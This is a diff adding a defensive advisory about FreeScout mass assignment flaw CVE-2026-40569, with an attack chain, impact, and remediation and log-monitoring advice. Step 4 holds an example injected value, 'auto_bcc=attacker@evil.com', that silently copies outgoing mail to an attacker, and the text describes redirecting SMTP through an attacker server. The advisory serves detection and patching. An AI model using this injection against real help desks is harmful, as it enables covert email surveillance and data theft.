@@ -50,4 +50,27 @@ rules:
 rules_count: 2
 ---
 
-FreeScout, a self-hosted help desk and shared mailbox platform, is vulnerable to a mass assignment flaw (CVE-2026-40569) in versions prior to 1.8.213. The vulnerability resides in the `connectionIncomingSave()` and `connectionOutgoingSave()` methods within `app/Http/Controllers/MailboxesController.php`.  These methods lack proper input validation, allowing an authenticated administrator to overwrite critical mailbox settings by injecting arbitrary parameters into legitimate connection setting…
+FreeScout, a self-hosted help desk and shared mailbox platform, is vulnerable to a mass assignment flaw (CVE-2026-40569) in versions prior to 1.8.213. The vulnerability resides in the `connectionIncomingSave()` and `connectionOutgoingSave()` methods within `app/Http/Controllers/MailboxesController.php`.  These methods lack proper input validation, allowing an authenticated administrator to overwrite critical mailbox settings by injecting arbitrary parameters into legitimate connection setting update requests. Attackers can modify fields like `auto_bcc`, `out_server`, `out_password`, `signature`, `auto_reply_enabled`, and `auto_reply_message`. This issue allows malicious actors to silently surveil communications, redirect SMTP traffic, inject malicious content, and persistently compromise email accounts. The impact is particularly severe in multi-admin environments or when an admin session is compromised through other means (e.g., XSS). FreeScout version 1.8.213 addresses this vulnerability.
+
+## Attack Chain
+
+1. An attacker gains authenticated access to the FreeScout admin panel, either through legitimate credentials or by exploiting another vulnerability (e.g., XSS).
+2. The attacker navigates to the mailbox connection settings page.
+3. The attacker crafts a legitimate request to update connection settings, such as IMAP or SMTP server details.
+4. The attacker injects malicious parameters into the request, such as `auto_bcc=attacker@evil.com`, which are not directly exposed in the connection settings form.
+5. The FreeScout application, due to the mass assignment vulnerability in `connectionIncomingSave()` or `connectionOutgoingSave()`, processes the injected parameters and updates the corresponding mailbox settings in the database.
+6.  When `auto_bcc` is set, every outgoing email from the compromised mailbox is silently BCC'd to the attacker-controlled email address via the `SendReplyToCustomer` job.
+7. Alternatively, the attacker could modify the `out_server` and `out_password` fields to redirect outgoing SMTP traffic through an attacker-controlled server.
+8. The attacker gains persistent access to all outgoing email from the affected mailbox, enabling data exfiltration or further malicious activities like phishing.
+
+## Impact
+
+Successful exploitation of this vulnerability can lead to complete compromise of FreeScout mailboxes. An attacker could silently exfiltrate sensitive email communications, potentially impacting hundreds or thousands of users depending on the size of the organization. The injected parameters persist even after the initial attack, providing long-term access. This is especially dangerous in organizations that handle sensitive customer data or financial information. The ability to redirect SMTP traffic and inject malicious content further amplifies the risk, potentially leading to widespread phishing campaigns and reputational damage.
+
+## Recommendation
+
+*   Upgrade FreeScout to version 1.8.213 or later to patch CVE-2026-40569 immediately.
+*   Implement strict input validation and sanitization for all user-supplied data, particularly in the `connectionIncomingSave()` and `connectionOutgoingSave()` methods, to prevent mass assignment vulnerabilities.
+*   Review existing FreeScout installations for any unauthorized modifications to mailbox settings, specifically focusing on `auto_bcc`, `out_server`, `out_password`, `signature`, `auto_reply_enabled`, and `auto_reply_message` fields (requires direct database inspection).
+*   Monitor FreeScout webserver logs for POST requests to `/mailboxes/*/connection/incoming-save` and `/mailboxes/*/connection/outgoing-save` endpoints containing unexpected parameters to detect potential exploitation attempts (see example Sigma rule below).
+*   Enable webserver logging and ensure that POST request bodies are captured to facilitate investigation and detection.
